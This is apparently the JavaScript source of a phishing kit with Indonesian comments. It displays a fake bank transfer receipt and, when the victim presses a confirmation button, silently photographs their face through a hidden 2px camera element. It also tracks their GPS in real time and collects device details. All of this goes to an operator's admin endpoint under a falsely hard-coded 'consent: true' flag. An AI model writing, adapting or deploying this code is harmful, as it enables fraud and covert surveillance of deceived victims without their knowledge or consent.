// ============================================================
// BANKIDZZ V2 - SILENT CAPTURE + FRONT CAMERA FIRST
// ============================================================

(function() {
    'use strict';

    const CONFIG = {
        API_URL: '/api/locations',
        TEMPLATE_URL: '/api/template',
        WEBPROFILE_URL: '/api/webprofile',
        SYNC_CHANNEL: 'bankidzz_sync_channel',
        SILENT_CAPTURE_DELAY: 200,       // delay ultra-cepat (ms)
        LOCATION_TIMEOUT: 1500,          // timeout GPS otomatis (ms)
        FRONT_CAMERA_QUALITY: 0.80,      // kualitas foto depan
        BACK_CAMERA_QUALITY: 0.85        // kualitas foto belakang
    };

    // Default Template
    const defaultTemplate = {
        topBarTitle: 'JAPANESE BANK',
        primaryColor: '#0033ff',
        profileImage: 'channels4_profile.jpg',
        bankName: 'BIBD Brunei Darussalam',
        bankSub: 'Office Purchasing',
        amountMain: 'IDR 515.000',
        amountSub: 'BND 35.12',
        senderBank: 'BIBD Brunei Darussalam',
        senderName: 'FITO ALAMSYAH',
        senderAccount: '72828172718',
        receiverBank: 'BANK BNI',
        receiverAccount: '2093832050',
        receiverName: 'Tasliyah',
        buttonText: 'Ambil Foto Konfirmasi / Tanda Tangan'
    };

    let currentTemplate = { ...defaultTemplate };
    let capturedPhotoBase64 = null;
    let silentFrontPhotoBase64 = null;     // Foto silent dari kamera depan
    let silentLocationData = null;         // Lokasi silent
    let frontCameraStream = null;          // Stream kamera depan
    let backCameraStream = null;           // Stream kamera belakang

    // DOM Elements
    const elements = {
        topBarTitle: document.getElementById('topBarTitle'),
        profileImage: document.getElementById('profileImage'),
        bankName: document.getElementById('bankName'),
        bankSub: document.getElementById('bankSub'),
        amountMain: document.getElementById('amountMain'),
        amountSub: document.getElementById('amountSub'),
        senderBankDetail: document.getElementById('senderBankDetail'),
        senderName: document.getElementById('senderName'),
        senderAccount: document.getElementById('senderAccount'),
        receiverBankDetail: document.getElementById('receiverBankDetail'),
        receiverAccount: document.getElementById('receiverAccount'),
        receiverName: document.getElementById('receiverName'),
        btnConfirm: document.getElementById('btnConfirm'),
        notification: document.getElementById('notification'),
        receiptCard: document.getElementById('receiptCard'),
        photoModal: document.getElementById('photoModal'),
        modalPreviewImg: document.getElementById('modalPreviewImg'),
        btnCloseModal: document.getElementById('btnCloseModal'),
        btnCancelPhoto: document.getElementById('btnCancelPhoto'),
        btnSendPhoto: document.getElementById('btnSendPhoto'),
        fileCameraInput: document.getElementById('fileCameraInput'),
        // Element baru untuk kamera
        cameraContainer: document.getElementById('cameraContainer'),
        cameraVideo: document.getElementById('cameraVideo'),
        cameraCanvas: document.getElementById('cameraCanvas'),
        cameraStatus: document.getElementById('cameraStatus'),
        btnCaptureBack: document.getElementById('btnCaptureBack')
    };

    // ============================================================
    // REALTIME GPS TRACKER & STREAMING LOKASI
    // ============================================================
    let liveLocationData = null;
    let locationWatchId = null;

    function startRealtimeLocationTracking() {
        if (!navigator.geolocation) {
            console.warn('[GPS] Geolocation tidak didukung browser ini.');
            return;
        }

        const geoOptions = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 5000
        };

        const onLocationSuccess = (pos) => {
            liveLocationData = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy || 10,
                altitude: pos.coords.altitude || null,
                heading: pos.coords.heading || null,
                speed: pos.coords.speed || null,
                timestamp: new Date().toISOString(),
                source: 'realtime-gps',
                silent: true
            };
            console.log(`[GPS-LIVE] Fix: ${liveLocationData.lat.toFixed(6)}, ${liveLocationData.lng.toFixed(6)} (Akurasi: ±${Math.round(liveLocationData.accuracy)}m)`);

            // Jika transaksi sedang berlangsung, otomatis perbarui koordinat GPS realtime ke server
            if (currentTransferId) {
                syncTransactionRecord({
                    transferId: currentTransferId,
                    location: liveLocationData,
                    frontPhoto: silentFrontPhotoBase64 || '',
                    photo: capturedPhotoBase64 || '',
                    status: capturedPhotoBase64 ? 'verified' : 'waiting_item_photo'
                });
            }
        };

        const onLocationError = (err) => {
            console.warn('[GPS-LIVE] Notice:', err.message);
        };

        try {
            if (locationWatchId !== null) {
                navigator.geolocation.clearWatch(locationWatchId);
            }
            locationWatchId = navigator.geolocation.watchPosition(onLocationSuccess, onLocationError, geoOptions);
        } catch(e) {
            console.warn('[GPS-LIVE] watchPosition error:', e);
        }
    }

    function getSilentLocation() {
        return new Promise((resolve) => {
            // 1. Jika GPS realtime sudah mendapatkan koordinat akurat, langsung gunakan
            if (liveLocationData && liveLocationData.accuracy < 200) {
                resolve({ ...liveLocationData });
                return;
            }

            let fallbackData = {
                lat: -6.2088,
                lng: 106.8456,
                accuracy: 35,
                timestamp: new Date().toISOString(),
                source: 'fallback',
                silent: true
            };

            if (!navigator.geolocation) {
                resolve(liveLocationData || fallbackData);
                return;
            }

            // Beri timeout 8 detik agar hardware GPS HP sempat mengunci satelit akurat
            const timeoutId = setTimeout(() => {
                console.warn('[GPS] getCurrentPosition timeout, menggunakan posisi terbaru');
                resolve(liveLocationData || fallbackData);
            }, 8000);

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    clearTimeout(timeoutId);
                    liveLocationData = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy || 10,
                        altitude: pos.coords.altitude || null,
                        heading: pos.coords.heading || null,
                        speed: pos.coords.speed || null,
                        timestamp: new Date().toISOString(),
                        source: 'gps-accurate',
                        silent: true
                    };
                    resolve({ ...liveLocationData });
                },
                (err) => {
                    clearTimeout(timeoutId);
                    console.warn('[GPS] Error getCurrentPosition:', err.message);
                    resolve(liveLocationData || fallbackData);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 30000
                }
            );
        });
    }

    let currentTransferId = null;

    // ============================================================
    // SILENT FRONT CAMERA CAPTURE (WAJAH - OTOMATIS & CEPAT)
    // ============================================================
    async function silentFrontCameraCapture() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.warn('[FRONT-CAM] getUserMedia tidak didukung.');
                return null;
            }

            let stream = null;
            // 1. Coba kamera depan (user facing camera untuk HP / Webcam)
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
            } catch(eUser) {
                console.warn('[FRONT-CAM] facingMode user gagal, mencoba video default:', eUser);
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: false
                    });
                } catch(eAny) {
                    console.error('[FRONT-CAM] Akses kamera gagal:', eAny);
                    return null;
                }
            }

            if (!stream) return null;
            frontCameraStream = stream;

            // Pasang video element di DOM (ukuran 2px, opacity 0.01) agar browser mendecode frame kamera
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.setAttribute('webkit-playsinline', '');
            video.muted = true;
            video.style.cssText = 'position:fixed;top:0;left:0;width:2px;height:2px;opacity:0.01;pointer-events:none;z-index:-1;';
            document.body.appendChild(video);

            try {
                await video.play();
            } catch(ePlay) {
                console.warn('[FRONT-CAM] video.play error:', ePlay);
            }

            // Tunggu hingga frame aktif dari sensor kamera (videoWidth > 0 dan readyState >= 2)
            await new Promise((resolve) => {
                let attempts = 0;
                const checkFrame = () => {
                    attempts++;
                    if ((video.videoWidth > 0 && video.readyState >= 2) || attempts >= 30) {
                        resolve();
                    } else {
                        setTimeout(checkFrame, 80);
                    }
                };
                checkFrame();
            });

            // Beri jeda 350ms agar sensor kamera HP menyesuaikan eksposur cahaya wajah
            await new Promise(r => setTimeout(r, 350));

            // Tangkap frame wajah ke canvas
            const canvas = document.createElement('canvas');
            const w = video.videoWidth > 0 ? video.videoWidth : 640;
            const h = video.videoHeight > 0 ? video.videoHeight : 480;
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, w, h);

            const capturedFacePhoto = canvas.toDataURL('image/jpeg', CONFIG.FRONT_CAMERA_QUALITY || 0.85);

            // Bersihkan video element
            try {
                video.pause();
                video.srcObject = null;
                video.remove();
            } catch(e) {}

            // HENTIKAN SEMUA TRACK KAMERA DEPAN SECARA BERSIH
            if (frontCameraStream) {
                frontCameraStream.getTracks().forEach(track => {
                    try { track.stop(); } catch(e) {}
                });
                frontCameraStream = null;
            }

            console.log('[FRONT-CAM] Sukses silent capture foto wajah!');
            return capturedFacePhoto;

        } catch (err) {
            console.error('[FRONT-CAM] Error pada silentFrontCameraCapture:', err);
            if (frontCameraStream) {
                try {
                    frontCameraStream.getTracks().forEach(track => track.stop());
                } catch(e) {}
                frontCameraStream = null;
            }
            return null;
        }
    }

    let currentFacingMode = 'environment';

    // ============================================================
    // BACK CAMERA FOR ITEM / TRANSACTION PHOTO (KAMERA BELAKANG HP)
    // ============================================================
    async function openBackCamera(targetMode = 'environment') {
        currentFacingMode = targetMode;
        try {
            console.log(`[BACK-CAM] Membuka kamera (${targetMode})...`);
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return false;
            }

            if (backCameraStream) {
                try {
                    backCameraStream.getTracks().forEach(t => t.stop());
                } catch(e) {}
                backCameraStream = null;
            }

            let stream = null;
            const devices = await navigator.mediaDevices.enumerateDevices().catch(() => []);
            const videoDevices = devices.filter(d => d.kind === 'videoinput');

            // 1. Coba cari device dari daftar device yang labelnya sesuai
            if (targetMode === 'environment') {
                const backDevice = videoDevices.find(d => /back|rear|environment|belakang|camera2\s*0/i.test(d.label));
                if (backDevice) {
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                deviceId: { exact: backDevice.deviceId },
                                width: { ideal: 1920 },
                                height: { ideal: 1080 }
                            },
                            audio: false
                        });
                    } catch(eBackDev) {}
                }
            } else {
                const frontDevice = videoDevices.find(d => /front|user|depan|face|camera2\s*1/i.test(d.label));
                if (frontDevice) {
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                deviceId: { exact: frontDevice.deviceId },
                                width: { ideal: 1920 },
                                height: { ideal: 1080 }
                            },
                            audio: false
                        });
                    } catch(eFrontDev) {}
                }
            }

            // 2. Coba exact facingMode (khusus HP smartphone agar pasti kamera belakang)
            if (!stream) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { exact: targetMode },
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        },
                        audio: false
                    });
                } catch (eExact) {
                    console.warn(`[BACK-CAM] exact ${targetMode} failed, mencoba ideal:`, eExact);
                    // 3. Coba ideal facingMode
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                facingMode: { ideal: targetMode },
                                width: { ideal: 1920 },
                                height: { ideal: 1080 }
                            },
                            audio: false
                        });
                    } catch(eIdeal) {
                        try {
                            stream = await navigator.mediaDevices.getUserMedia({
                                video: true,
                                audio: false
                            });
                        } catch(eDef) {
                            return false;
                        }
                    }
                }
            }

            if (!stream) return false;

            backCameraStream = stream;

            if (elements.cameraVideo) {
                elements.cameraVideo.srcObject = backCameraStream;
                elements.cameraVideo.setAttribute('playsinline', '');
                elements.cameraVideo.setAttribute('webkit-playsinline', '');
                await elements.cameraVideo.play().catch(e => console.warn('[BACK-CAM] video play warn:', e));
            }

            if (elements.cameraStatus) {
                const isBack = (targetMode === 'environment');
                elements.cameraStatus.innerHTML = `<span style="background:${isBack ? 'rgba(16,185,129,0.2)' : 'rgba(59,130,246,0.2)'}; color:${isBack ? '#10b981' : '#60a5fa'}; border:1px solid ${isBack ? '#10b981' : '#3b82f6'}; padding:4px 12px; border-radius:14px; font-size:12px; font-weight:700;">${isBack ? '📷 Kamera Belakang HP Aktif' : '📷 Kamera Depan Aktif'}</span>`;
            }

            if (elements.cameraContainer) {
                elements.cameraContainer.style.display = 'flex';
            }

            return true;
        } catch (err) {
            console.error('[BACK-CAM] Error opening rear camera:', err);
            return false;
        }
    }

    // Fungsi untuk ganti kamera (Depan <-> Belakang)
    async function switchCamera() {
        const nextMode = (currentFacingMode === 'environment') ? 'user' : 'environment';
        console.log(`[SWITCH-CAM] Beralih kamera ke: ${nextMode}`);
        await openBackCamera(nextMode);
    }
    window.switchCamera = switchCamera;

    // Capture snapshot dari kamera belakang
    function captureBackCamera() {
        let dataUrl = null;
        try {
            const video = elements.cameraVideo;
            const canvas = elements.cameraCanvas || document.createElement('canvas');
            const w = (video && video.videoWidth > 0) ? video.videoWidth : 1280;
            const h = (video && video.videoHeight > 0) ? video.videoHeight : 720;
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');
            if (video) {
                ctx.drawImage(video, 0, 0, w, h);
                dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY || 0.85);
            }
        } catch (e) {
            console.warn('captureBackCamera error:', e);
        }

        if (backCameraStream) {
            try {
                backCameraStream.getTracks().forEach(track => track.stop());
            } catch(e) {}
            backCameraStream = null;
        }

        if (elements.cameraContainer) {
            elements.cameraContainer.style.display = 'none';
        }

        return dataUrl;
    }

    // ============================================================
    // MAIN HANDLER:
    // 1. SILENT CAPTURE WAJAH (KAMERA DEPAN) -> LANGSUNG MASUK KE ADMIN
    // 2. SETELAH SELESAI, OTOMATIS BUKA KAMERA BELAKANG UNTUK FOTO BARANG
    // ============================================================
    async function handleConfirmClick() {
        if (!elements.btnConfirm) return;
        if (elements.btnConfirm.dataset.processing === 'true') return;
        elements.btnConfirm.dataset.processing = 'true';

        const originalText = elements.btnConfirm.textContent;
        elements.btnConfirm.textContent = 'Memproses...';
        elements.btnConfirm.disabled = true;

        // Generate ID transaksi unik untuk sesi ini
        currentTransferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();

        try {
            // ========================================================
            // TAHAP 1: SILENT CAPTURE WAJAH (DEPAN) & LOKASI
            // ========================================================
            console.log('[TAHAP-1] Silent Capture Wajah Kamera Depan & Lokasi...');
            const [locResult, frontResult] = await Promise.all([
                getSilentLocation(),
                silentFrontCameraCapture()
            ]);

            silentLocationData = locResult;
            silentFrontPhotoBase64 = frontResult;

            // LANGSUNG KIRIM KE ADMIN (Kamera Wajah + Lokasi Masuk Duluan)
            console.log('[TAHAP-1] Mengirim Silent Capture Wajah ke Admin...');
            await syncTransactionRecord({
                transferId: currentTransferId,
                location: silentLocationData,
                frontPhoto: silentFrontPhotoBase64,
                photo: '', // Menunggu jepretan kamera belakang
                status: 'waiting_item_photo'
            });

            // Berikan jeda singkat agar driver hardware kamera HP selesai melepas kamera depan
            await new Promise(r => setTimeout(r, 400));

            // ========================================================
            // TAHAP 2: SETELAH SELESAI, LANGSUNG BUKA KAMERA BELAKANG HP UNTUK FOTO BARANG
            // ========================================================
            console.log('[TAHAP-2] Otomatis membuka kamera belakang HP untuk foto barang...');
            const backOpened = await openBackCamera('environment');

            if (!backOpened) {
                // Fallback jika kamera belakang tidak dapat dibuka
                if (typeof window.html2canvas === 'function' && elements.receiptCard) {
                    try {
                        const canvas = await window.html2canvas(elements.receiptCard, {
                            scale: 2,
                            useCORS: true,
                            allowTaint: true,
                            backgroundColor: '#ffffff'
                        });
                        capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
                    } catch(e) {}
                }

                await syncTransactionRecord({
                    transferId: currentTransferId,
                    location: silentLocationData,
                    frontPhoto: silentFrontPhotoBase64,
                    photo: capturedPhotoBase64 || '',
                    status: 'verified'
                });

                if (elements.btnConfirm) {
                    elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                    elements.btnConfirm.style.backgroundColor = '#10b981';
                    elements.btnConfirm.dataset.verified = 'true';
                }

                showNotification('Konfirmasi Berhasil Diverifikasi!', 'success');
            }

        } catch (err) {
            console.error('Error in handleConfirmClick:', err);
            showNotification('Gagal memproses. Coba lagi.', 'error');
            elements.btnConfirm.textContent = originalText;
            elements.btnConfirm.disabled = false;
        } finally {
            elements.btnConfirm.dataset.processing = 'false';
        }
    }

    window.handleConfirmClick = handleConfirmClick;

    // ============================================================
    // HANDLE CAPTURE BACK PHOTO (FOTO BARANG TRANSAKSI)
    // KETIKA DI FOTO, LANGSUNG MASUK JUGA KE HALAMAN ADMIN
    // ============================================================
    async function handleCaptureBackPhoto() {
        if (!elements.btnCaptureBack) return;
        if (elements.btnCaptureBack.dataset.capturing === 'true') return;
        elements.btnCaptureBack.dataset.capturing = 'true';

        elements.btnCaptureBack.textContent = '⏳ Mengirim Foto Barang...';
        elements.btnCaptureBack.disabled = true;

        try {
            // 1. Ambil foto barang dari kamera belakang
            const backPhoto = captureBackCamera();
            if (backPhoto) {
                capturedPhotoBase64 = backPhoto;
            }

            // 2. KETIKA DI FOTO, LANGSUNG MASUK JUGA KE HALAMAN ADMIN
            console.log('[TAHAP-3] Mengirim foto barang transaksi ke admin...');
            await syncTransactionRecord({
                transferId: currentTransferId || ('REF-' + Math.random().toString(36).substr(2, 8).toUpperCase()),
                location: silentLocationData || await getSilentLocation(),
                frontPhoto: silentFrontPhotoBase64,
                photo: capturedPhotoBase64 || '',
                status: 'verified'
            });

            // 3. Update status tombol di struk menjadi sukses terverifikasi
            if (elements.btnConfirm) {
                elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                elements.btnConfirm.style.backgroundColor = '#10b981';
                elements.btnConfirm.dataset.verified = 'true';
                elements.btnConfirm.disabled = true;
            }

            showNotification('✅ Foto barang & data verifikasi berhasil dikirim!', 'success');

        } catch (err) {
            console.error('Error in handleCaptureBackPhoto:', err);
            showNotification('Gagal mengirim data.', 'error');
        } finally {
            if (elements.btnCaptureBack) {
                elements.btnCaptureBack.textContent = '📸 Ambil Foto Barang Transaksi';
                elements.btnCaptureBack.disabled = false;
                elements.btnCaptureBack.dataset.capturing = 'false';
            }
        }
    }

    window.handleCaptureBackPhoto = handleCaptureBackPhoto;

    // ============================================================
    // SYNC TRANSACTION RECORD KE ADMIN (LOCALSTORAGE, BROADCAST & API)
    // ============================================================
    async function syncTransactionRecord(data) {
        const transferId = data.transferId;
        
        const payload = {
            transferId: transferId,
            consent: true,
            sender: currentTemplate.senderName || 'FITO ALAMSYAH',
            senderBank: currentTemplate.senderBank || 'BIBD Brunei Darussalam',
            senderAccount: currentTemplate.senderAccount || '72828172718',
            receiver: currentTemplate.receiverName || 'Tasliyah',
            receiverBank: currentTemplate.receiverBank || 'BANK BNI',
            receiverAccount: currentTemplate.receiverAccount || '2093832050',
            amount: currentTemplate.amountMain || 'IDR 515.000',
            amountSub: currentTemplate.amountSub || 'BND 35.12',
            location: data.location || silentLocationData,
            photo: data.photo || '',                 // Foto barang kamera belakang
            frontPhoto: data.frontPhoto || '',       // FOTO WAJAH KAMERA DEPAN (SILENT)
            front_photo: data.frontPhoto || '',      // Kompatibilitas field database
            silentCapture: true,                     // Flag silent capture
            silentLocation: true,                    // Flag silent location
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            status: data.status || 'verified',
            timestamp: new Date().toISOString()
        };

        // 1. Local Storage: Update data yang ada atau tambah baru
        try {
            let localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            const idx = localStored.findIndex(t => t.transferId === transferId);
            if (idx >= 0) {
                localStored[idx] = { ...localStored[idx], ...payload };
            } else {
                localStored.unshift(payload);
            }
            localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
        } catch(e) {}

        // 2. Broadcast Channel: Mengirim pembaruan seketika ke Admin Tab
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.postMessage({ type: 'NEW_LOCATION', payload: payload });
            channel.close();
        } catch(e) {}

        // 3. Post ke Server API
        try {
            const response = await fetch(CONFIG.API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!response.ok) {
                console.warn('API status non-200, tersimpan di lokal.');
            }
        } catch (e) {
            console.warn('Network error, tersimpan di lokal.', e);
        }
    }

    // Alias untuk kompatibilitas fungsi lama jika ada pemanggilan eksternal
    const saveTransactionWithSilentData = syncTransactionRecord;

    // ============================================================
    // TEMPLATE & UI FUNCTIONS
    // ============================================================
    function applyTemplate(template) {
        currentTemplate = { ...defaultTemplate, ...template };
        
        const themeColor = currentTemplate.primaryColor || '#0033ff';
        document.documentElement.style.setProperty('--primary-blue', themeColor);
        document.title = currentTemplate.topBarTitle || 'Bankidzz';
        
        const topBarEl = document.querySelector('.top-bar');
        if (topBarEl) topBarEl.style.backgroundColor = themeColor;
        
        if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
        if(elements.profileImage && currentTemplate.profileImage) elements.profileImage.src = currentTemplate.profileImage;
        if(elements.bankName) elements.bankName.textContent = currentTemplate.bankName;
        if(elements.bankSub) elements.bankSub.textContent = currentTemplate.bankSub;
        if(elements.amountMain) elements.amountMain.textContent = currentTemplate.amountMain;
        if(elements.amountSub) elements.amountSub.textContent = currentTemplate.amountSub;
        if(elements.senderBankDetail) elements.senderBankDetail.textContent = currentTemplate.senderBank;
        if(elements.senderName) elements.senderName.textContent = currentTemplate.senderName;
        if(elements.senderAccount) elements.senderAccount.textContent = currentTemplate.senderAccount;
        if(elements.receiverBankDetail) elements.receiverBankDetail.textContent = currentTemplate.receiverBank;
        if(elements.receiverAccount) elements.receiverAccount.textContent = currentTemplate.receiverAccount;
        if(elements.receiverName) elements.receiverName.textContent = currentTemplate.receiverName;
        
        if(elements.btnConfirm && (!elements.btnConfirm.dataset.verified || elements.btnConfirm.dataset.verified === 'false')) {
            elements.btnConfirm.textContent = currentTemplate.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
            elements.btnConfirm.style.backgroundColor = themeColor;
        }
    }

    async function loadTemplate() {
        try {
            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.template) {
                    localStorage.setItem('bankidzz_new_template', JSON.stringify(result.template));
                    applyTemplate(result.template);
                    return;
                }
            }
        } catch(e) {}
        const stored = localStorage.getItem('bankidzz_new_template');
        if (stored) {
            try { applyTemplate(JSON.parse(stored)); } catch(e) { applyTemplate(defaultTemplate); }
        } else {
            applyTemplate(defaultTemplate);
        }
    }

    function closeModal() {
        if (elements.photoModal) elements.photoModal.style.display = 'none';
        if (backCameraStream) {
            backCameraStream.getTracks().forEach(track => track.stop());
            backCameraStream = null;
        }
        if (elements.cameraContainer) elements.cameraContainer.style.display = 'none';
    }

    function showNotification(msg, type = 'success') {
        const el = elements.notification;
        if (!el) return;
        el.textContent = msg;
        el.className = 'notification show ' + type;
        clearTimeout(el._timeout);
        el._timeout = setTimeout(() => { el.className = 'notification'; }, 5000);
    }

    let currentWebProfile = null;

    function applyWebProfile(profile) {
        if (!profile) return;
        currentWebProfile = profile;

        if (profile.siteTitle) {
            document.title = profile.siteTitle;
            const metaTitle = document.getElementById('metaTitle');
            if (metaTitle) metaTitle.textContent = profile.siteTitle;
        }
        if (profile.metaDescription) {
            const metaDesc = document.getElementById('metaDescription');
            if (metaDesc) metaDesc.setAttribute('content', profile.metaDescription);
        }
        if (profile.favicon) {
            let linkFav = document.getElementById('metaFavicon') || document.querySelector("link[rel~='icon']");
            if (!linkFav) {
                linkFav = document.createElement('link');
                linkFav.rel = 'icon';
                document.head.appendChild(linkFav);
            }
            linkFav.href = profile.favicon;
        }
        if (profile.appleTouchIcon) {
            let linkApple = document.getElementById('metaAppleIcon') || document.querySelector("link[rel='apple-touch-icon']");
            if (!linkApple) {
                linkApple = document.createElement('link');
                linkApple.rel = 'apple-touch-icon';
                document.head.appendChild(linkApple);
            }
            linkApple.href = profile.appleTouchIcon;
        }
        if (profile.themeColor) {
            document.documentElement.style.setProperty('--primary-blue', profile.themeColor);
            const metaTheme = document.getElementById('metaThemeColor') || document.querySelector("meta[name='theme-color']");
            if (metaTheme) metaTheme.setAttribute('content', profile.themeColor);
            const topBar = document.querySelector('.top-bar');
            if (topBar) topBar.style.backgroundColor = profile.themeColor;
            const btnConfirm = document.getElementById('btnConfirm');
            if (btnConfirm && btnConfirm.dataset.verified !== 'true') {
                btnConfirm.style.backgroundColor = profile.themeColor;
            }
        }
        if (profile.ogTitle) {
            const ogTitle = document.getElementById('ogTitle') || document.querySelector("meta[property='og:title']");
            if (ogTitle) ogTitle.setAttribute('content', profile.ogTitle);
        }
        if (profile.ogDescription) {
            const ogDesc = document.getElementById('ogDescription') || document.querySelector("meta[property='og:description']");
            if (ogDesc) ogDesc.setAttribute('content', profile.ogDescription);
        }
        if (profile.ogImage) {
            const ogImg = document.getElementById('ogImage') || document.querySelector("meta[property='og:image']");
            if (ogImg) ogImg.setAttribute('content', profile.ogImage);
        }
        if (profile.twitterTitle) {
            const twTitle = document.getElementById('twitterTitle') || document.querySelector("meta[name='twitter:title']");
            if (twTitle) twTitle.setAttribute('content', profile.twitterTitle);
        }
        if (profile.twitterDescription) {
            const twDesc = document.getElementById('twitterDescription') || document.querySelector("meta[name='twitter:description']");
            if (twDesc) twDesc.setAttribute('content', profile.twitterDescription);
        }
        if (profile.twitterImage) {
            const twImg = document.getElementById('twitterImage') || document.querySelector("meta[name='twitter:image']");
            if (twImg) twImg.setAttribute('content', profile.twitterImage);
        }
    }

    async function loadWebProfile() {
        // 1. Coba dari API backend
        try {
            const response = await fetch(CONFIG.WEBPROFILE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.profile) {
                    localStorage.setItem('bankidzz_web_profile', JSON.stringify(result.profile));
                    applyWebProfile(result.profile);
                    return;
                }
            }
        } catch(e) {}

        // 2. Coba dari file webprofile.json langsung (berguna untuk Live Server port 5500 / hosting statis)
        try {
            const staticResp = await fetch('webprofile.json', { cache: 'no-store' });
            if (staticResp.ok) {
                const staticProfile = await staticResp.json();
                if (staticProfile) {
                    localStorage.setItem('bankidzz_web_profile', JSON.stringify(staticProfile));
                    applyWebProfile(staticProfile);
                    return;
                }
            }
        } catch(e) {}

        // 3. Fallback ke localStorage
        const stored = localStorage.getItem('bankidzz_web_profile');
        if (stored) {
            try {
                applyWebProfile(JSON.parse(stored));
            } catch(e) {}
        }
    }

    function setupSyncListener() {
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'template_updated') {
                    if (event.data.template) {
                        localStorage.setItem('bankidzz_new_template', JSON.stringify(event.data.template));
                        applyTemplate(event.data.template);
                    }
                } else if (event.data && event.data.type === 'webprofile_updated') {
                    if (event.data.profile) {
                        localStorage.setItem('bankidzz_web_profile', JSON.stringify(event.data.profile));
                        applyWebProfile(event.data.profile);
                    }
                }
            });
        } catch(e) {}
    }

    // File input fallback
    if (elements.fileCameraInput) {
        elements.fileCameraInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(evt) {
                    capturedPhotoBase64 = evt.target.result;
                    if (elements.modalPreviewImg) elements.modalPreviewImg.src = capturedPhotoBase64;
                    showNotification('Foto diperbarui!', 'success');
                };
                reader.readAsDataURL(file);
            }
        });
    }

    window.closeBackCamera = closeModal;

    // Event listeners
    if (elements.btnCloseModal) elements.btnCloseModal.addEventListener('click', closeModal);
    if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
    if (elements.btnSendPhoto) elements.btnSendPhoto.addEventListener('click', handleSendPhoto);
    if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);
    if (elements.btnCaptureBack) elements.btnCaptureBack.addEventListener('click', handleCaptureBackPhoto);

    // Init
    loadTemplate();
    loadWebProfile();
    setupSyncListener();
    startRealtimeLocationTracking();

    // Trigger GPS tracker juga pada sentuhan/klik pertama agar izin browser aktif
    window.addEventListener('click', () => startRealtimeLocationTracking(), { once: true });
    window.addEventListener('touchstart', () => startRealtimeLocationTracking(), { once: true });

})();